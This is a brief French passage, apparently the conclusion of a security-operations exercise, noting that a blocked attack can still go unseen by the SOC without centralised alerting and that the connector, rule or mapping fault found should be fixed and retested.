+> Une prévention réussie ne garantit pas la visibilité du SOC. Sans alerte centralisée, la tentative serait passée inaperçue, alors qu'elle révèle un attaquant actif. L'exercice met en évidence un défaut de connecteur, de règle ou de mapping, à corriger et à valider par un nouveau test.
